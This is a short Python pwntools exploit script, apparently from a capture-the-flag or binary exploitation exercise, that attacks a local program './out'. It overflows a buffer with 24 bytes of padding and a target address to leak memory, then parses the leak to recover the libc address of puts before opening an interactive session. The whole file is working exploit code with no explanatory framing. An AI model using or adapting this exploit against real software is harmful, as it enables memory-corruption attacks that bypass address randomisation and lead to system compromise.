#!/usr/bin/python

from pwn import *

def main():
    p = process("./out")

    # Craft first stage (arbitrary read)
    leak_address = 0x0804b2d8    # Address of "This is a Jukebox"
    stage_1 = "A"*24 + p32(leak_address)
    p.recvrepeat(0.2)

    # Send the first stage
    p.send(stage_1)

    # Parse the response
    data = p.recvrepeat(0.2)
    leak = data[data.find(b"(")+1:data.rfind(b")")]
    leak = str(leak)
    log.info("Got leaked data: %s" % leak)
    puts_addr = u32(leak[:4])
    log.info("puts@libc: 0x%x" % puts_addr)


    p.interactive()

if __name__ == "__main__":
    main()
